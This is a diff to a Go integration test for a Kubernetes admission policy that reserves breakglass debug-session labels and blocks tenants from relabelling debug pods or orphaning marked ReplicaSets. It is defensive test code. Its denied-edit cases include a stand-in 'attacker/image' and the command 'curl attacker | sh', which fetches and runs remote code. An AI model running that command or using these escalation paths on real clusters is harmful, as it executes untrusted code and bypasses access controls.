@@ -72,10 +72,11 @@ func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
 	forger, forgerKube := as("tenant@example.com")
 	controller, _ := as("system:serviceaccount:breakglass-system:breakglass-manager")
 	replicaSetController, _ := as("system:serviceaccount:kube-system:replicaset-controller")
+	deploymentController, _ := as("system:serviceaccount:kube-system:deployment-controller")
 
-	denied := func(t *testing.T, err error) {
+	denied := func(t *testing.T, err error, msgAndArgs ...any) {
 		t.Helper()
-		require.Error(t, err)
+		require.Error(t, err, msgAndArgs...)
 		assert.Contains(t, err.Error(), "reserved for the breakglass controller")
 	}
 	pod := func(name string, labels, annotations map[string]string) *corev1.Pod {
@@ -111,10 +112,12 @@ func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
 			return forger.Update(ctx, p)
 		}
 		denied(t, mutate("plain", func(p *corev1.Pod) { p.Labels[DebugSessionLabelKey] = "s1" }))
+		assert.NoError(t, mutate("plain", func(p *corev1.Pod) { p.Labels["team"] = "a" }), "ordinary pods are unaffected")
 		denied(t, mutate("debug", func(p *corev1.Pod) { p.Labels[DebugSessionLabelKey] = "s2" }))
 		denied(t, mutate("debug", func(p *corev1.Pod) { delete(p.Labels, DebugSessionLabelKey) }))
 		denied(t, mutate("debug", func(p *corev1.Pod) { delete(p.Annotations, DebugSessionUIDAnnotationKey) }))
-		assert.NoError(t, mutate("debug", func(p *corev1.Pod) { p.Labels["team"] = "a" }), "other keys of a debug pod stay editable")
+		assert.NoError(t, mutate("debug", func(p *corev1.Pod) { p.Annotations["team"] = "a" }), "annotations of a debug pod stay editable")
+		denied(t, mutate("debug", func(p *corev1.Pod) { p.Labels["team"] = "a" }), "labels select a debug pod into its workload")
 
 		p := &corev1.Pod{}
 		require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: "plain"}, p))
@@ -201,11 +204,37 @@ func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
 			return forger.Update(ctx, d)
 		}
 		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Spec.Replicas = ptr.To[int32](2) }))
-		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Labels = map[string]string{"team": "a"} }))
+		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Annotations = map[string]string{"team": "a"} }))
+		denied(t, edit(func(d *appsv1.Deployment) { d.Labels = map[string]string{"team": "a"} }))
 		denied(t, edit(func(d *appsv1.Deployment) { d.Spec.Template.Spec.Containers[0].Image = "attacker/image" }))
 		denied(t, edit(func(d *appsv1.Deployment) {
 			d.Spec.Template.Spec.Containers[0].Command = []string{"sh", "-c", "curl attacker | sh"}
 		}))
+
+		// A marked ReplicaSet owned by the debug Deployment: detaching it
+		// would let its exempt controller keep creating marked Pods after
+		// cleanup deletes the Deployment.
+		require.NoError(t, admin.Get(ctx, client.ObjectKeyFromObject(debugDeployment), debugDeployment))
+		owner := metav1.OwnerReference{APIVersion: "apps/v1", Kind: "Deployment", Name: debugDeployment.Name, UID: debugDeployment.UID,
+			Controller: ptr.To(true), BlockOwnerDeletion: ptr.To(true)}
+		owned := &appsv1.ReplicaSet{ObjectMeta: metav1.ObjectMeta{Name: "owned", Namespace: ns, Labels: map[string]string{"app": "w"},
+			OwnerReferences: []metav1.OwnerReference{owner}}, Spec: appsv1.ReplicaSetSpec{Selector: selector, Replicas: ptr.To[int32](0), Template: always}}
+		require.NoError(t, deploymentController.Create(ctx, owned))
+		editRS := func(c client.Client, change func(*appsv1.ReplicaSet)) error {
+			rs := &appsv1.ReplicaSet{}
+			require.NoError(t, admin.Get(ctx, client.ObjectKeyFromObject(owned), rs))
+			change(rs)
+			return c.Update(ctx, rs)
+		}
+		denied(t, editRS(forger, func(rs *appsv1.ReplicaSet) { rs.OwnerReferences = nil }), "orphaning a marked ReplicaSet")
+		denied(t, editRS(forger, func(rs *appsv1.ReplicaSet) { rs.Labels = map[string]string{"app": "detached"} }), "escaping re-adoption")
+		assert.NoError(t, editRS(forger, func(rs *appsv1.ReplicaSet) { rs.Spec.Replicas = ptr.To[int32](1) }), "scaling stays allowed")
+		assert.NoError(t, editRS(deploymentController, func(rs *appsv1.ReplicaSet) { rs.OwnerReferences = nil }),
+			"the deployment controller still releases ReplicaSets")
+		assert.NoError(t, editRS(controller, func(rs *appsv1.ReplicaSet) {
+			rs.OwnerReferences = []metav1.OwnerReference{owner}
+			rs.Labels = map[string]string{"app": "w", "team": "a"}
+		}), "the breakglass controller still manages ownership and labels")
 	})
 	// On a spoke reached over OIDC the controller writes as the mapped OIDC
 	// username, or is recognised by an OIDC group; both lists are configurable.
